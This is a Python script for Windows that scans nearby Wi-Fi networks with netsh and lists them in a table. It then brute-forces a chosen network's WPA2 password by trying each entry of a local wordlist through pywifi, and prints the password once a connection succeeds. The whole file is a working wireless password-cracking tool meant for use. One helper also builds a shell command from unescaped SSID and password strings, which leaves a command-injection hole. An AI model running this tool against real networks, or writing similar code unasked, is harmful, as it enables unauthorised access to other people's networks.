import subprocess
import time
import os
from columnar import columnar
import signal
import seedir as sd
try:
    import pywifi
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile
except:
    print("Install pywifi")


try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan()
    results = ifaces.scan_results()


    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("[-] Error system")

type = False

lt=False

def main(ssid, password, number):

    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP


    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(1)
    iface.connect(tmp_profile)
    time.sleep(2)

    if ifaces.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print('[*] Crack success!')
        print('[*] password is ' + password)
        time.sleep(1)
        exit()
    else:
        print('[{}] Crack Failed using {}'.format(number, password))

headers = ["Number",'SSID ', 'Channel', 'Signal', 'Authentication']


def connect_to_wifi(ssid, password):
    subprocess.run('netsh wlan add profile filename=C:\\Users\\eymen\\AppData\\Local\\Temp\\asdfasfasda',check=True, shell=True)

    command = f'netsh wlan connect ssid="{ssid}" name="{ssid}" key="{password}"'

    try:
        subprocess.run(command, check=True, shell=True)
        print(f"Bağlantı {ssid} ağına başarıyla gerçekleştirildi.")
    except subprocess.CalledProcessError as e:
        print(f"Bağlantı sırasında bir hata oluştu: {e}")

def scanwifi():
    cmd = subprocess.Popen(['netsh', 'wlan', 'show', 'networks', 'mode=Bssid'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)

    stdout, stderr = cmd.communicate()

    output = stdout.decode("utf-8")

    cmtoutput = output.split("\n")
    networks = []
    current_network = []

    i = 0
    for line in cmtoutput:
        line = line.strip()


        if line.startswith('SSID'):

            if current_network:
                networks.append(current_network)
                current_network = []

            current_network.append(str(i))
            ssid = line.split(':')[1].strip()
            current_network.append(ssid)
            i+=1


        if line.startswith('Channel'):
            channel = line.split(':')[1].strip()
            current_network.append(channel)


        if line.startswith('Signal'):
            signal = line.split(':')[1].strip()
            current_network.append(signal)

        if line.startswith('Authentication'):
            authentication = line.split(':')[1].strip()
            current_network.append(authentication)

    if current_network:
        networks.append(current_network)

    os.system("cls")

    table = columnar(networks, headers, no_borders=False)

    print(table)
    return networks


def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)

def handle_signal(signum, frame):
    global is_running
    is_running = False

is_running = True

while is_running:
    networks = scanwifi()
    print("Hold CTRL+C to Select Network")
    signal.signal(signal.SIGINT, handle_signal)
    time.sleep(1)

os.system("cls")
table = columnar(networks, headers, no_borders=False)
print(table)

numara = int(input("Select Network: "))
os.system("cls")
print("Selected Network: ")
nc = networks[numara][1:]
for a in nc:
    print(a,sep=" | ")

cpath = os.getcwd() + "\wordlists"
sd.seedir(path=cpath, style='lines',  exclude_folders='.git')


file = input("Write Wordlist Name (ex: names.txt) : ")

id = 0
for root, dirs, files in os.walk(cpath):
    if file in files:
        file_path = os.path.join(root, file)
        pwd(networks[numara][1], file_path)

else:
    print(f"Something Wrong. Try Again...")

